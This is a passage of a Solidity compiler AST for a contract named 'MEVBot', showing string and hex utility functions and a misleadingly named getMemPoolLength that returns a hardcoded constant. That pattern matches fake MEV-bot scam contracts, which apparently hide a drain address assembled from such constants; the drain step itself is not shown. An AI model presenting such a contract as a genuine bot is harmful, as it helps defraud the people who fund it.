																"src": "10042:41:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 979,
															"nodeType": "ExpressionStatement",
															"src": "10042:41:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 982,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 980,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 917,
																	"src": "10097:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3136",
																	"id": 981,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "10102:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_16_by_1",
																		"typeString": "int_const 16"
																	},
																	"value": "16"
																},
																"src": "10097:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 983,
															"nodeType": "ExpressionStatement",
															"src": "10097:7:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 955,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 953,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 950,
														"src": "9990:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 954,
														"name": "count",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 923,
														"src": "9992:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "9990:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 985,
												"initializationExpression": {
													"assignments": [
														950
													],
													"declarations": [
														{
															"constant": false,
															"id": 950,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 985,
															"src": "9980:6:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 949,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "9980:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 952,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 951,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "9987:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "9980:8:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 957,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": true,
														"src": "9999:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 956,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 950,
															"src": "10001:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 958,
													"nodeType": "ExpressionStatement",
													"src": "9999:3:0"
												},
												"nodeType": "ForStatement",
												"src": "9975:140:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 988,
															"name": "res",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 943,
															"src": "10139:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 987,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "10132:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 986,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "10132:6:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 989,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10132:11:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 921,
												"id": 990,
												"nodeType": "Return",
												"src": "10125:18:0"
											}
										]
									},
									"documentation": null,
									"id": 992,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "checkLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 918,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 917,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 992,
												"src": "9752:6:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 916,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "9752:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9751:8:0"
									},
									"returnParameters": {
										"id": 921,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 920,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 992,
												"src": "9783:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 919,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "9783:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "9782:15:0"
									},
									"scope": 1583,
									"src": "9728:422:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 999,
										"nodeType": "Block",
										"src": "10213:35:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "3134323938313935303037",
													"id": 997,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "10230:11:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_14298195007_by_1",
														"typeString": "int_const 14298195007"
													},
													"value": "14298195007"
												},
												"functionReturnParameters": 996,
												"id": 998,
												"nodeType": "Return",
												"src": "10223:18:0"
											}
										]
									},
									"documentation": null,
									"id": 1000,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolLength",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 993,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "10181:2:0"
									},
									"returnParameters": {
										"id": 996,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 995,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1000,
												"src": "10207:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 994,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "10207:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10206:6:0"
									},
									"scope": 1583,
									"src": "10156:92:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1049,
										"nodeType": "Block",
										"src": "10613:568:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1013,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1009,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1002,
															"src": "10627:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 1010,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 37,
														"src": "10627:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1011,
															"name": "needle",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1004,
															"src": "10639:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 1012,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 37,
														"src": "10639:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "10627:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1017,
												"nodeType": "IfStatement",
												"src": "10623:65:0",
												"trueBody": {
													"id": 1016,
													"nodeType": "Block",
													"src": "10652:36:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1014,
																"name": "self",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1002,
																"src": "10673:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																	"typeString": "struct MEVBot.slice memory"
																}
															},
															"functionReturnParameters": 1008,
															"id": 1015,
															"nodeType": "Return",
															"src": "10666:11:0"
														}
													]
												}
											},
											{
												"assignments": [
													1019
												],
												"declarations": [
													{
														"constant": false,
														"id": 1019,
														"mutability": "mutable",
														"name": "equal",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1049,
														"src": "10698:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1018,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "10698:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1021,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 1020,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "10711:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10698:17:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1026,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1022,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1002,
															"src": "10729:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 1023,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 39,
														"src": "10729:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1024,
															"name": "needle",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1004,
															"src": "10742:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 1025,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 39,
														"src": "10742:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "10729:24:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1029,
												"nodeType": "IfStatement",
												"src": "10725:320:0",
												"trueBody": {
													"id": 1028,
													"nodeType": "Block",
													"src": "10755:290:0",
													"statements": [
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "10778:257:0",
																"statements": [
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "10796:27:0",
																		"value": {
																			"arguments": [
																				{
																					"name": "needle",
																					"nodeType": "YulIdentifier",
																					"src": "10816:6:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "10810:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "10810:13:0"
																		},
																		"variables": [
																			{
																				"name": "length",
																				"nodeType": "YulTypedName",
																				"src": "10800:6:0",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "10840:37:0",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "self",
																							"nodeType": "YulIdentifier",
																							"src": "10865:4:0"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "10871:4:0",
																							"type": "",
																							"value": "0x20"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "10861:3:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "10861:15:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "10855:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "10855:22:0"
																		},
																		"variables": [
																			{
																				"name": "selfptr",
																				"nodeType": "YulTypedName",
																				"src": "10844:7:0",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "10894:41:0",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "needle",
																							"nodeType": "YulIdentifier",
																							"src": "10921:6:0"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "10929:4:0",
																							"type": "",
																							"value": "0x20"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "10917:3:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "10917:17:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "10911:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "10911:24:0"
																		},
																		"variables": [
																			{
																				"name": "needleptr",
																				"nodeType": "YulTypedName",
																				"src": "10898:9:0",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulAssignment",
																		"src": "10952:69:0",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "selfptr",
																							"nodeType": "YulIdentifier",
																							"src": "10974:7:0"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "10983:6:0"
																						}
																					],
																					"functionName": {
																						"name": "keccak256",
																						"nodeType": "YulIdentifier",
																						"src": "10964:9:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "10964:26:0"
																				},
																				{
																					"arguments": [
																						{
																							"name": "needleptr",
																							"nodeType": "YulIdentifier",
																							"src": "11002:9:0"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "11013:6:0"
																						}
																					],
																					"functionName": {
																						"name": "keccak256",
																						"nodeType": "YulIdentifier",
																						"src": "10992:9:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "10992:28:0"
																				}
																			],
																			"functionName": {
																				"name": "eq",
																				"nodeType": "YulIdentifier",
																				"src": "10961:2:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "10961:60:0"
																		},
																		"variableNames": [
																			{
																				"name": "equal",
																				"nodeType": "YulIdentifier",
																				"src": "10952:5:0"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 1019,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "10952:5:0",
																	"valueSize": 1
																},
																{
																	"declaration": 1004,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "10816:6:0",
																	"valueSize": 1
																},
																{
																	"declaration": 1004,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "10921:6:0",
																	"valueSize": 1
																},
																{
																	"declaration": 1002,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "10865:4:0",
																	"valueSize": 1
																}
															],
															"id": 1027,
															"nodeType": "InlineAssembly",
															"src": "10769:266:0"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1030,
													"name": "equal",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1019,
													"src": "11059:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1046,
												"nodeType": "IfStatement",
												"src": "11055:98:0",
												"trueBody": {
													"id": 1045,
													"nodeType": "Block",
													"src": "11066:87:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1036,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1031,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1002,
																		"src": "11080:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																			"typeString": "struct MEVBot.slice memory"
																		}
																	},
																	"id": 1033,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 37,
																	"src": "11080:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "-=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1034,
																		"name": "needle",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1004,
																		"src": "11093:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																			"typeString": "struct MEVBot.slice memory"
																		}
																	},
																	"id": 1035,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 37,
																	"src": "11093:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "11080:24:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1037,
															"nodeType": "ExpressionStatement",
															"src": "11080:24:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1043,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1038,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1002,
																		"src": "11118:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																			"typeString": "struct MEVBot.slice memory"
																		}
																	},
																	"id": 1040,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_ptr",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 39,
																	"src": "11118:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1041,
																		"name": "needle",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1004,
																		"src": "11131:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																			"typeString": "struct MEVBot.slice memory"
																		}
																	},
																	"id": 1042,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 37,
																	"src": "11131:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "11118:24:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1044,
															"nodeType": "ExpressionStatement",
															"src": "11118:24:0"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1047,
													"name": "self",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1002,
													"src": "11170:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
														"typeString": "struct MEVBot.slice memory"
													}
												},
												"functionReturnParameters": 1008,
												"id": 1048,
												"nodeType": "Return",
												"src": "11163:11:0"
											}
										]
									},
									"documentation": null,
									"id": 1050,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "beyond",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1005,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1002,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1050,
												"src": "10536:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
													"typeString": "struct MEVBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1001,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 40,
													"src": "10536:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$40_storage_ptr",
														"typeString": "struct MEVBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1004,
												"mutability": "mutable",
												"name": "needle",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1050,
												"src": "10555:19:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
													"typeString": "struct MEVBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1003,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 40,
													"src": "10555:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$40_storage_ptr",
														"typeString": "struct MEVBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10535:40:0"
									},
									"returnParameters": {
										"id": 1008,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1007,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1050,
												"src": "10599:12:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
													"typeString": "struct MEVBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1006,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 40,
													"src": "10599:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$40_storage_ptr",
														"typeString": "struct MEVBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10598:14:0"
									},
									"scope": 1583,
									"src": "10520:661:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1171,
										"nodeType": "Block",
										"src": "11443:1267:0",
										"statements": [
											{
												"assignments": [
													1064
												],
												"declarations": [
													{
														"constant": false,
														"id": 1064,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1171,
														"src": "11453:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1063,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "11453:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1066,
												"initialValue": {
													"argumentTypes": null,
													"id": 1065,
													"name": "selfptr",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1054,
													"src": "11464:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "11453:18:0"
											},
											{
												"assignments": [
													1068
												],
												"declarations": [
													{
														"constant": false,
														"id": 1068,
														"mutability": "mutable",
														"name": "idx",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1171,
														"src": "11481:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1067,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "11481:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1069,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "11481:8:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1072,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1070,
														"name": "needlelen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1056,
														"src": "11504:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1071,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1052,
														"src": "11517:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "11504:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1166,
												"nodeType": "IfStatement",
												"src": "11500:1170:0",
												"trueBody": {
													"id": 1165,
													"nodeType": "Block",
													"src": "11526:1144:0",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1075,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1073,
																	"name": "needlelen",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1056,
																	"src": "11544:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
